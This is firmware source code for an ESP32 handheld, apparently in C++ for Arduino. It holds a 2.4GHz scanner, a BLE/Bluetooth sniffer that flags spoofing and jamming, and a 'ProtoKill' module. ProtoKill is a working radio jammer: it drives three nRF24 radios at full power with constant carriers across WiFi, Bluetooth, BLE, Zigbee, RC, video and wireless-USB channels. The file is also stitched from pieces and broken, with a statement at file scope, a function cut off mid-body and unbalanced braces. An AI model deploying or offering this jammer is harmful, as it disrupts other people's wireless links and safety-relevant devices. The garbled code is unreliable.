uint16_t Buffercolor[MAX_LINES];
int Index = 0;

void scroll() {
  for (int i = 3; i < MAX_LINES - 1; i++) {
    Buffer[i] = Buffer[i + 1];
    Buffercolor[i] = Buffercolor[i + 1];
  }
}

void Print(String text, uint16_t color, bool extraSpace = false) {
  if (Index >= MAX_LINES - 1) {
    scroll();
    Index = MAX_LINES - 1;
  }

  Buffer[Index] = text;
  Buffercolor[Index] = color;
  Index++;

  if (extraSpace && Index < MAX_LINES) {
    Buffer[Index] = "";
    Buffercolor[Index] = TFT_WHITE;
    Index++;
  }

  for (int i = 3; i < Index; i++) {
    int yPos = i * LINE_HEIGHT + 15;
    tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);
    tft.setTextColor(Buffercolor[i], TFT_BLACK);
    tft.setCursor(5, yPos);
    tft.print(Buffer[i]);
  }
}

byte getRegister(byte r) {
  byte c;
  digitalWrite(CSN, LOW);
  SPI.transfer(r & 0x1F);
  c = SPI.transfer(0);
  digitalWrite(CSN, HIGH);
  return c;
}

void setRegister(byte r, byte v) {
  digitalWrite(CSN, LOW);
  SPI.transfer((r & 0x1F) | 0x20);
  SPI.transfer(v);
  digitalWrite(CSN, HIGH);
}

bool carrierDetected() {
  return getRegister(_NRF24_RPD) & 0x01;
}

void setChannel(uint8_t channel) {
  setRegister(_NRF24_RF_CH, channel);
}

void powerUp() {
  setRegister(_NRF24_CONFIG, getRegister(_NRF24_CONFIG) | 0x02);
  delayMicroseconds(130);
}

void powerDown() {
  setRegister(_NRF24_CONFIG, getRegister(_NRF24_CONFIG) & ~0x02);
}

void enable() {
  digitalWrite(CE, HIGH);
}

void disable() {
  digitalWrite(CE, LOW);
}

void setRX() {
  setRegister(_NRF24_CONFIG, getRegister(_NRF24_CONFIG) | 0x01);
  enable();
  delayMicroseconds(100);
}

void runUI() {
#define SCREEN_WIDTH  240
#define SCREEN_HEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 3

  static int iconX[ICON_NUM] = {170, 210, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_undo,   
    bitmap_icon_start,
    bitmap_icon_go_back
  };

  if (!uiDrawn) {
    tft.fillRect(0, 20, 160, 16, DARK_GRAY);
    tft.setTextColor(TFT_WHITE);
    tft.setCursor(35, 24);
    tft.print("2.4GHz Scanner");

    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
    tft.fillRect(160, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, ORANGE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;  
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      animationState = 2;

      switch (activeIcon) {
        case 0: calibrateBackgroundNoise(); break;
        case 1: scan(); break;
        case 2: scanning = false; feature_exit_requested = true; break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    if (ts.touched() && feature_active) {
      TS_Point p = ts.getPoint();
      int x = map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
      int y = map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);

      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
              animationState = 1;
              activeIcon = i;
              lastAnimationTime = millis();
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

if (!scanning) return;

void scannerSetup() {
  tft.setRotation(0);
  tft.fillScreen(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, false);
  uiDrawn = false;
  display();

  setupTouchscreen();

  Print(" ", TFT_GREEN, false);
  Print(" ", TFT_GREEN, false);
  Print(" ", TFT_GREEN, false);
  Print("[*] 2.4GHz Scanner Initialized...", TFT_GREEN, false);

  SPI.begin(18, 19, 23, 17);
  SPI.setDataMode(SPI_MODE0);
  SPI.setFrequency(10000000);
  SPI.setBitOrder(MSBFIRST);

  pinMode(CE, OUTPUT);
  pinMode(CSN, OUTPUT);

  disable();
  powerUp();
  setRegister(_NRF24_EN_AA, 0x0);
  setRegister(_NRF24_RF_SETUP, 0x0F);

  scanning = true;
}

void scannerLoop() {
  scanning = true;
  while (scanning) {
    runUI();
    scanChannels();
    outputChannels();
    display();
    delay(5);
  }
}


/*
   ProtoKill



*/

namespace ProtoKill {

#define CE_PIN_1  16
#define CSN_PIN_1 17
#define CE_PIN_2  26
#define CSN_PIN_2 27
#define CE_PIN_3  4
#define CSN_PIN_3 5

RF24 radio1(CE_PIN_1, CSN_PIN_1, 16000000);
RF24 radio2(CE_PIN_2, CSN_PIN_2, 16000000);
RF24 radio3(CE_PIN_3, CSN_PIN_3, 16000000);

enum OperationMode {
  BLE_MODULE, Bluetooth_MODULE, WiFi_MODULE,
  VIDEO_TX_MODULE, RC_MODULE, USB_WIRELESS_MODULE,
  ZIGBEE_MODULE, NRF24_MODULE
};
OperationMode currentMode = WiFi_MODULE;

bool jammerActive = false;

const byte bluetooth_channels[]        = {32, 34, 46, 48, 50, 52, 0, 1, 2, 4, 6, 8, 22, 24, 26, 28, 30, 74, 76, 78, 80};
const byte ble_channels[]              = {2, 26, 80};
const byte WiFi_channels[]             = {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12};
const byte usbWireless_channels[]      = {40, 50, 60};
const byte videoTransmitter_channels[] = {70, 75, 80};
const byte rc_channels[]               = {1, 3, 5, 7};
const byte zigbee_channels[]           = {11, 15, 20, 25};
const byte nrf24_channels[]            = {76, 78, 79};

byte channelGroup1[] = {2, 5, 8, 11};
byte channelGroup2[] = {26, 29, 32, 35};
byte channelGroup3[] = {80, 83, 86, 89};

#define SCREEN_HEIGHT 300
#define LINE_HEIGHT 12
#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

String Buffer[MAX_LINES];
uint16_t Buffercolor[MAX_LINES];
int Index = 0;

void scroll() {
  for (int i = 3; i < MAX_LINES - 1; i++) {
    Buffer[i] = Buffer[i + 1];
    Buffercolor[i] = Buffercolor[i + 1];
  }
}

void Print(String text, uint16_t color, bool extraSpace = false) {
  if (Index >= MAX_LINES - 1) {
    scroll();
    Index = MAX_LINES - 1;
  }

  Buffer[Index] = text;
  Buffercolor[Index] = color;
  Index++;

  if (extraSpace && Index < MAX_LINES) {
    Buffer[Index] = "";
    Buffercolor[Index] = TFT_WHITE;
    Index++;
  }

  for (int i = 3; i < Index; i++) {
    int yPos = i * LINE_HEIGHT + 15;
    tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);
    tft.setTextColor(Buffercolor[i], TFT_BLACK);
    tft.setCursor(5, yPos);
    tft.print(Buffer[i]);
  }
}

void configureRadio(RF24 &radio, const byte* channels, size_t size) {
  radio.setAutoAck(false);
  radio.stopListening();
  radio.setRetries(0, 0);
  radio.setPALevel(RF24_PA_MAX, true);
  radio.setDataRate(RF24_2MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);
  radio.printPrettyDetails();

  for (size_t i = 0; i < size; i++) {
    radio.setChannel(channels[i]);
    radio.startConstCarrier(RF24_PA_MAX, channels[i]);
  }
}

void initializeRadiosMultiMode() {
  if (radio1.begin()) configureRadio(radio1, channelGroup1, sizeof(channelGroup1));
  if (radio2.begin()) configureRadio(radio2, channelGroup2, sizeof(channelGroup2));
  if (radio3.begin()) configureRadio(radio3, channelGroup3, sizeof(channelGroup3));
}

void initializeRadios() {
  if (jammerActive) {
    initializeRadiosMultiMode();
  } else {
    radio1.powerDown();
    radio2.powerDown();
    radio3.powerDown();
  }
}

void updateTFT() {
  tft.fillRect(0, 39, 240, 320, TFT_BLACK);
  tft.fillRect(0, 19, 240, 16, DARK_GRAY);
  tft.setTextSize(1);
  tft.setTextColor(WHITE, DARK_GRAY);

  struct ButtonGuide {
    const char* label;
    const unsigned char* icon;
  };

  ButtonGuide buttons[] = {
    {jammerActive ? "[ON]" : "[OFF]", bitmap_icon_UP},
    {"MODE-", bitmap_icon_LEFT},
    {"MODE+", bitmap_icon_RIGHT}
  };

  int xPos = 20;
  int yPosIcon = 19;
  int spacing = 75;

  for (int i = 0; i < 3; i++) {
    tft.drawBitmap(xPos, yPosIcon, buttons[i].icon, 16, 16, TFT_WHITE);
    tft.setCursor(xPos + 18, yPosIcon + 4);
    tft.print(buttons[i].label);
    if (i < 2) {
      int sepX = xPos + spacing - 8;
      tft.drawFastVLine(sepX, 22, 12, LIGHT_GRAY);
    }
    xPos += spacing;
  }

  tft.drawRoundRect(0, 19, 240, 16, 4, LIGHT_GRAY);
  tft.drawLine(0, 19, 240, 19, TFT_WHITE);
}

void runProtoKillUI() {
  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    if (ts.touched() && feature_active) {
      TS_Point p = ts.getPoint();
      int x = map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
      int y = map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);

      if (y > 19 && y < 35) {
        if (x > 20 && x < 36) {
          jammerActive = !jammerActive;
          initializeRadios();
          updateTFT();
          printJammerStatus(jammerActive);
        } else if (x > 95 && x < 111) {
          currentMode = static_cast<OperationMode>((currentMode == 0) ? 7 : (currentMode - 1));
          initializeRadios();
          updateTFT();
          printModeChange(currentMode);
        } else if (x > 170 && x < 186) {
          currentMode = static_cast<OperationMode>((currentMode + 1) % 8);
          initializeRadios();
          updateTFT();
          printModeChange(currentMode);
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void printModeChange(OperationMode mode) {
  String modeText = "[+] Mode changed to: ";
  switch (mode) {
    case BLE_MODULE:          modeText += "BLE";       break;
    case Bluetooth_MODULE:    modeText += "Bluetooth"; break;
    case WiFi_MODULE:         modeText += "WIFI";      break;
    case USB_WIRELESS_MODULE: modeText += "USB";       break;
    case VIDEO_TX_MODULE:     modeText += "Video";     break;
    case RC_MODULE:           modeText += "RC";        break;
    case ZIGBEE_MODULE:       modeText += "ZIGBEE";    break;
    case NRF24_MODULE:        modeText += "NRF24";     break;
    default: modeText += "Unknown"; break;
  }
  Print(modeText, TFT_WHITE, false);
}

void printJammerStatus(bool active) {
  String jammerText = "[!] Jammer ";
  jammerText += active ? "Activated" : "Deactivated";
  Print(jammerText, TFT_RED, false);
}

void prokillSetup() {
  tft.fillScreen(TFT_BLACK);
  tft.setRotation(0);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, false);
  updateTFT();

  Print("===== System Diagnostics =====", TFT_CYAN, false);
 
/*
 * 
 * BLE Sniffer
 * 
 * 
*/

namespace BleSniffer {

#define SCREEN_WIDTH  240
#define SCREENHEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 3

static bool uiDrawn = false;

static int iconX[ICON_NUM] = {170, 210, 10};
static const unsigned char* icons[ICON_NUM] = {
  bitmap_icon_undo,
  bitmap_icon_eye2,
  bitmap_icon_go_back // Added back icon
};  

#define HEADER_HEIGHT 20
#define STATUS_DOT_SIZE 8
#define LINE_HEIGHT 16
#define MAX_LINES 16
#define MAX_DEVICES 32
#define SCAN_INTERVAL 5000
#define MAX_LINE_LENGTH 38
#define BEACON_PREFIX "4c000215"
#define ALERT_FLASH_DURATION 1000
#define SEPARATOR_THICKNESS 1
#define SEPARATOR_MARGIN 5
#define Y_OFFSET 37

struct Config {
  static constexpr int tftRotation = 0;
  static constexpr int serialBaud = 115200;
  static constexpr int bleScanDuration = 5;
  static constexpr int btScanDuration = 5;
  static constexpr int maxPacketCount = 20;
  static constexpr int minRssiThreshold = -20;
  static constexpr int maxNewDevices = 20;
  static constexpr int maxMfgDataLength = 31;
  static constexpr unsigned long deviceTimeout = 30000;
  static constexpr int maxRandomizedMacChanges = 5;
};

enum class MessageType {
  DEVICE,
  ALERT,
  STATUS
};

struct DeviceInfo {
  String mac;
  int rssi = 0;
  int packetCount = 0;
  bool isSuspicious = false;
  String deviceName;
  String serviceUUID;
  String beaconUUID;
  unsigned long lastSeen = 0;
  bool display = true;
  bool jammingAlerted = false;
  bool isBLE = true;
  int macChangeCount = 0;
};

struct DisplayLine {
  String text;
  uint16_t color = GREEN;
  uint16_t originalColor = GREEN;
  bool isAlert = false;
  unsigned long flashUntil = 0;
  MessageType type = MessageType::DEVICE;
};

class BluetoothSniffer {
private:
  TFT_eSPI tft;
  DeviceInfo devices[MAX_DEVICES];
  DisplayLine displayLines[MAX_LINES];
  int deviceCount = 0;
  int lineNumber = 1;
  int suspiciousCount = 0;
  int newDevicesThisScan = 0;
  int lastDeviceCount = -1;
  int lastSuspiciousCount = -1;
  bool scanning = true;
  bool isBLEScanActive = true;
  unsigned long lastScanTime = 0;
  unsigned long lastFlashToggle = 0;
  bool flashState = false;
  BLEScan* pBLEScan = nullptr;
  static BluetoothSniffer* snifferInstance;

  void initDisplay() {
    uiDrawn = false;

    float currentBatteryVoltage = readBatteryVoltage();
    drawStatusBar(currentBatteryVoltage, false);
    runUI();
  
    setupTouchscreen();
    tft.fillRect(0, 37, 240, 320, TFT_BLACK);
    tft.setTextSize(1);
    updateHeader();
    //addLine("Bluetooth Sniffer Started T:" + String(millis()), DARK_GRAY, true, MessageType::STATUS);
  }

  void updateHeader() {
    tft.fillRect(0, Y_OFFSET, tft.width(), HEADER_HEIGHT, DARK_GRAY);
    tft.setTextColor(WHITE, DARK_GRAY);
    tft.setCursor(5, Y_OFFSET + 6);
    String status = isBLEScanActive ? "BLE Scanning" : "BT Scanning";
    tft.print(status + " | Dev: " + String(deviceCount) + " Sus: " + String(suspiciousCount));
    uint16_t dotColor = isBLEScanActive ? BLUE : GREEN;
    tft.fillCircle(tft.width() - 10, 46, STATUS_DOT_SIZE / 2, dotColor);
    tft.drawLine(0, 56, 240, 56, ORANGE);
  }

  void updateDisplay() {
    unsigned long now = millis();
    if (now - lastFlashToggle >= 500) {
      flashState = !flashState;
      lastFlashToggle = now;
    }
    tft.fillRect(0, Y_OFFSET + HEADER_HEIGHT, tft.width(), tft.height() - HEADER_HEIGHT, TFT_BLACK);
    for (int i = 0; i < MAX_LINES; i++) {
      if (displayLines[i].text.isEmpty()) continue;
      int y = Y_OFFSET + HEADER_HEIGHT + (i * LINE_HEIGHT);
      uint16_t textColor = displayLines[i].originalColor;
      if (displayLines[i].isAlert && displayLines[i].flashUntil > now) {
        textColor = flashState ? displayLines[i].originalColor : TFT_BLACK;
      }
      tft.setTextColor(textColor, TFT_BLACK);
      tft.setCursor(5, y + 2);
      tft.print(displayLines[i].text);
      if (displayLines[i].originalColor == ORANGE && !displayLines[i].isAlert) {
        tft.drawRect(3, y, tft.width() - 6, LINE_HEIGHT - 2, ORANGE);
      }
      if (i < MAX_LINES - 1 && !displayLines[i + 1].text.isEmpty() &&
          displayLines[i].type != displayLines[i + 1].type) {
        int separatorY = y + LINE_HEIGHT - 1;
        tft.drawFastHLine(SEPARATOR_MARGIN, separatorY, tft.width() - 2 * SEPARATOR_MARGIN, DARK_GRAY);
      }
    }
    if (deviceCount != lastDeviceCount || suspiciousCount != lastSuspiciousCount) {
      updateHeader();
      lastDeviceCount = deviceCount;
      lastSuspiciousCount = suspiciousCount;
    }
    if (deviceCount == 0 && lineNumber == 1) {
      tft.setTextColor(GREEN, TFT_BLACK);
      tft.setCursor(5, Y_OFFSET + HEADER_HEIGHT + 10);
      //tft.print("No Devices Detected");
    }
  }

  void addLine(String text, uint16_t color, bool isAlert = false, MessageType type = MessageType::DEVICE) {
    if (text.length() > MAX_LINE_LENGTH) {
      text = text.substring(0, MAX_LINE_LENGTH - 3) + "...";
    }
    for (int i = MAX_LINES - 1; i > 0; i--) {
      displayLines[i] = displayLines[i - 1];
    }
    displayLines[0].text = text;
    displayLines[0].color = color;
    displayLines[0].originalColor = (type == MessageType::STATUS) ? DARK_GRAY : color;
    displayLines[0].isAlert = isAlert;
    displayLines[0].flashUntil = isAlert ? millis() + ALERT_FLASH_DURATION : 0;
    displayLines[0].type = type;
    updateDisplay();
  }

  void checkSuspiciousActivity(int idx, unsigned long timestamp) {
    auto& device = devices[idx];
    if (device.packetCount > Config::maxPacketCount || (device.isBLE && device.rssi > Config::minRssiThreshold)) {
      if (!device.isSuspicious) {
        device.isSuspicious = true;
        suspiciousCount++;
        if (device.display && !device.jammingAlerted) {
          String protocol = device.isBLE ? "BLE" : "BT";
          addLine(String(lineNumber++) + " -> Jamming Suspected (" + protocol + "): " + device.mac + " T:" + String(timestamp),
                  ORANGE, true, MessageType::ALERT);
          device.jammingAlerted = true;
        }
      }
    }
    if (device.isBLE && isRandomizedMac(device.mac) && device.macChangeCount > Config::maxRandomizedMacChanges) {
      device.isSuspicious = true;
      suspiciousCount++;
      if (device.display) {
        addLine(String(lineNumber++) + " -> MAC Spoofing Suspected (BLE): " + device.mac + " T:" + String(timestamp),
                ORANGE, true, MessageType::ALERT);
      }
    }
  }

  bool isRandomizedMac(const String& mac) {
    String firstByte = mac.substring(0, 2);
    char* end;
    long value = strtol(firstByte.c_str(), &end, 16);
    return (value & 0xC0) == 0xC0;
  }

  void processNewDevice(BLEAdvertisedDevice* bleDevice, esp_bt_gap_cb_param_t* btDevice, unsigned long timestamp, bool isBLE) {
    if (deviceCount >= MAX_DEVICES) {
      addLine("Max devices reached!", RED, true, MessageType::ALERT);
      return;
    }
    newDevicesThisScan++;
    auto& device = devices[deviceCount];
    device.isBLE = isBLE;
    if (isBLE) {
      device.mac = bleDevice->getAddress().toString().c_str();
      device.rssi = bleDevice->getRSSI();
      device.deviceName = bleDevice->getName().c_str();
      device.serviceUUID = bleDevice->getServiceUUID().toString().c_str();
      String mfgData = bleDevice->getManufacturerData().c_str();
      checkBeaconSpoofing(device, mfgData, timestamp);
      checkMalformedPacket(device, mfgData, timestamp);
    } else {
      char macStr[18];
      snprintf(macStr, sizeof(macStr), "%02X:%02X:%02X:%02X:%02X:%02X",
               btDevice->disc_res.bda[0], btDevice->disc_res.bda[1], btDevice->disc_res.bda[2],
               btDevice->disc_res.bda[3], btDevice->disc_res.bda[4], btDevice->disc_res.bda[5]);
      device.mac = macStr;
      device.rssi = 0;
    }
    device.packetCount = 1;
    device.lastSeen = timestamp;
    device.display = true;
    checkMacSpoofing(device, timestamp);
    checkSuspiciousActivity(deviceCount, timestamp);
    if (device.display) {
      String protocol = isBLE ? "BLE" : "BT";
      String line = String(lineNumber++) + " -> " + device.mac + " (" + String(device.rssi) + " dBm, " + protocol + ")";
      if (isBLE && !device.deviceName.isEmpty()) line += " N:" + device.deviceName.substring(0, 6);
      if (isBLE && !device.serviceUUID.isEmpty()) line += " U:" + device.serviceUUID.substring(0, 8);
      line += " T:" + String(timestamp).substring(0, 6);
      addLine(line, device.isSuspicious ? ORANGE : GREEN, false, MessageType::DEVICE);
    }
    deviceCount++;
    if (newDevicesThisScan > Config::maxNewDevices && device.display) {
      String protocol = isBLE ? "BLE" : "BT";
      addLine(String(lineNumber++) + " -> Flooding Detected (" + protocol + ") T:" + String(timestamp),
              ORANGE, true, MessageType::ALERT);
    }
  }

  void checkBeaconSpoofing(DeviceInfo& device, const String& mfgData, unsigned long timestamp) {
    if (!device.isBLE || !mfgData.startsWith(BEACON_PREFIX)) return;
    device.beaconUUID = mfgData.substring(4, 36);
    for (int i = 0; i < deviceCount; i++) {
      if (devices[i].beaconUUID == device.beaconUUID && devices[i].mac != device.mac) {
        devices[i].isSuspicious = true;
        device.isSuspicious = true;
        suspiciousCount++;
        if (device.display) {
          addLine(String(lineNumber++) + " -> Beacon Spoofing (BLE): " + device.mac + " T:" + String(timestamp),
                  ORANGE, true, MessageType::ALERT);
        }
      }
    }
  }

  void checkMalformedPacket(DeviceInfo& device, const String& mfgData, unsigned long timestamp) {
    if (!device.isBLE || mfgData.length() <= Config::maxMfgDataLength) return;
    device.isSuspicious = true;
    suspiciousCount++;
    if (device.display) {
      addLine(String(lineNumber++) + " -> Malformed Packet (BLE): " + device.mac + " T:" + String(timestamp),
              ORANGE, true, MessageType::ALERT);
    }
  }

  void checkMacSpoofing(DeviceInfo& device, unsigned long timestamp) {
    for (int i = 0; i < deviceCount; i++) {
      if (devices[i].mac == device.mac && i != deviceCount) {
        devices[i].isSuspicious = true;
        device.isSuspicious = true;
        suspiciousCount++;
        if (device.display) {
          String protocol = device.isBLE ? "BLE" : "BT";
          addLine(String(lineNumber++) + " -> Possible Spoofing (" + protocol + "): " + device.mac + " T:" + String(timestamp),
                  ORANGE, true, MessageType::ALERT);
        }
      }
    }
  }

  void cleanupDevices(unsigned long timestamp) {
    for (int i = 0; i < deviceCount; ) {
      if (timestamp - devices[i].lastSeen > Config::deviceTimeout) {
        if (devices[i].isSuspicious) suspiciousCount--;
        for (int j = i; j < deviceCount - 1; j++) {
          devices[j] = devices[j + 1];
        }
        deviceCount--;
      } else {
        i++;
      }
    }
  }

  void filterByMac(const String& filterMac) {
    for (int i = 0; i < deviceCount; i++) {
      devices[i].display = (devices[i].mac == filterMac);
    }
    refreshDisplay();
  }

  void filterSuspicious() {
    for (int i = 0; i < deviceCount; i++) {
      devices[i].display = devices[i].isSuspicious;
    }
    refreshDisplay();
  }

  void refreshDisplay() {
    for (int i = 0; i < MAX_LINES; i++) {
      displayLines[i].text = "";
      displayLines[i].color = GREEN;
      displayLines[i].originalColor = GREEN;
      displayLines[i].isAlert = false;
      displayLines[i].flashUntil = 0;
      displayLines[i].type = MessageType::DEVICE;
    }
    lineNumber = 1;
    tft.fillRect(0, Y_OFFSET + HEADER_HEIGHT, tft.width(), tft.height() - HEADER_HEIGHT, TFT_BLACK);
    for (int i = 0; i < deviceCount; i++) {
      if (devices[i].display) {
        String protocol = devices[i].isBLE ? "BLE" : "BT";
        String line = String(lineNumber++) + " -> " + devices[i].mac + " (" + String(devices[i].rssi) + " dBm, " + protocol + ")";
        if (devices[i].isBLE && !devices[i].deviceName.isEmpty()) line += " N:" + devices[i].deviceName.substring(0, 6);
        if (devices[i].isBLE && !devices[i].serviceUUID.isEmpty()) line += " U:" + devices[i].serviceUUID.substring(0, 8);
        line += " T:" + String(devices[i].lastSeen).substring(0, 6);
        addLine(line, devices[i].isSuspicious ? ORANGE : GREEN, false, MessageType::DEVICE);
      }
    }
  }

void runUI() {

  static int iconY = STATUS_BAR_Y_OFFSET;

  if (!uiDrawn) {
    tft.drawLine(0, 19, 240, 19, TFT_WHITE);
    tft.drawLine(0, 36, 240, 36, ORANGE);
    tft.fillRect(0, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      }
    }
    tft.drawLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, TFT_WHITE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, TFT_WHITE);
      animationState = 2;

      switch (activeIcon) {
        case 0:
            deviceCount = 0;
            suspiciousCount = 0;
            lastDeviceCount = -1;
            lastSuspiciousCount = -1;
            lineNumber = 1;
            for (int i = 0; i < MAX_LINES; i++) {
              displayLines[i].text = "";
              displayLines[i].color = GREEN;
              displayLines[i].originalColor = GREEN;
              displayLines[i].isAlert = false;
              displayLines[i].flashUntil = 0;
              displayLines[i].type = MessageType::DEVICE;
            }
            refreshDisplay();
            addLine("Device list reset", DARK_GRAY, true, MessageType::STATUS);
          break;
        case 1: 
           filterSuspicious();
          break;
        case 2: // Back icon action (exit to submenu)
           feature_exit_requested = true;
          break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    if (ts.touched() && feature_active) {
      TS_Point p = ts.getPoint();
      int x = ::map(p.x, 300, 3800, 0, SCREEN_WIDTH - 1);
      int y = ::map(p.y, 3800, 300, 0, SCREENHEIGHT - 1);

      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {
              tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
              animationState = 1;
              activeIcon = i;
              lastAnimationTime = millis();
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

public:
  void setup() {
    uiDrawn = false;

    float currentBatteryVoltage = readBatteryVoltage();
    drawStatusBar(currentBatteryVoltage, false);
    runUI();
  
    setupTouchscreen();
    
    initDisplay();
    BLEDevice::init("");
    pBLEScan = BLEDevice::getScan();
    pBLEScan->setAdvertisedDeviceCallbacks(new AdvertisedDeviceCallbacks(*this));
    pBLEScan->setActiveScan(true);
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    if (esp_bt_controller_init(&bt_cfg) != ESP_OK) {
      addLine("Failed to init BT controller", RED, true, MessageType::ALERT);
      return;
    }
    if (esp_bt_controller_enable(ESP_BT_MODE_BTDM) != ESP_OK) {
      addLine("Failed to enable BT controller", RED, true, MessageType::ALERT);
      return;
    }
    if (esp_bluedroid_init() != ESP_OK) {
      addLine("Failed to init Bluedroid", RED, true, MessageType::ALERT);
      return;
    }
    if (esp_bluedroid_enable() != ESP_OK) {
      addLine("Failed to enable Bluedroid", RED, true, MessageType::ALERT);
      return;
    }
    if (esp_bt_gap_register_callback(btCallback) != ESP_OK) {
      addLine("Failed to register BT callback", RED, true, MessageType::ALERT);
      return;
    }
    addLine("Bluetooth Sniffer Ready", DARK_GRAY, true, MessageType::STATUS);
    startBLEScan();
  }

  void loop() {
    unsigned long now = millis();
    tft.drawLine(0, 19, 240, 19, TFT_WHITE);

    updateStatusBar();
    runUI();
    cleanupDevices(now);
    if (scanning && now - lastScanTime >= SCAN_INTERVAL) {
      if (isBLEScanActive) {
        pBLEScan->stop();
        startBTScan();
        isBLEScanActive = false;
      } else {
        esp_bt_gap_cancel_discovery();
        startBLEScan();
        isBLEScanActive = true;
      }
      lastScanTime = now;
    }
    if (Serial.available()) {
      String input = Serial.readStringUntil('\n');
      input.trim();
      if (input.startsWith("FILTER MAC ")) {
        filterByMac(input.substring(11));
      } else if (input == "FILTER SUSPICIOUS") {
        filterSuspicious();
      } else if (input == "RESET") {
        deviceCount = 0;
        suspiciousCount = 0;
        lastDeviceCount = -1;
        lastSuspiciousCount = -1;
        lineNumber = 1;
        for (int i = 0; i < MAX_LINES; i++) {
          displayLines[i].text = "";
          displayLines[i].color = GREEN;
          displayLines[i].originalColor = GREEN;
          displayLines[i].isAlert = false;
          displayLines[i].flashUntil = 0;
          displayLines[i].type = MessageType::DEVICE;
        }
        refreshDisplay();
        addLine("Device list reset", DARK_GRAY, true, MessageType::STATUS);
      }
    }
  }

  class AdvertisedDeviceCallbacks : public BLEAdvertisedDeviceCallbacks {
    BluetoothSniffer& sniffer;
  public:
    AdvertisedDeviceCallbacks(BluetoothSniffer& s) : sniffer(s) {}
    void onResult(BLEAdvertisedDevice advertisedDevice) override {
      String mac = advertisedDevice.getAddress().toString().c_str();
      int rssi = advertisedDevice.getRSSI();
      unsigned long timestamp = millis();
      int idx = -1;
      for (int i = 0; i < sniffer.deviceCount; i++) {
        if (sniffer.devices[i].mac == mac && sniffer.devices[i].isBLE) {
          idx = i;
          break;
        }
      }
      if (idx >= 0) {
        sniffer.devices[idx].rssi = rssi;
        sniffer.devices[idx].packetCount++;
        sniffer.devices[idx].lastSeen = timestamp;
        if (sniffer.isRandomizedMac(mac)) {
          sniffer.devices[idx].macChangeCount++;
        }
        sniffer.checkSuspiciousActivity(idx, timestamp);
      } else {
        sniffer.processNewDevice(&advertisedDevice, nullptr, timestamp, true);
      }
    }
  };

  static void btCallback(esp_bt_gap_cb_event_t event, esp_bt_gap_cb_param_t *param) {
    if (!snifferInstance) return;
    if (event == ESP_BT_GAP_DISC_RES_EVT) {
      unsigned long timestamp = millis();
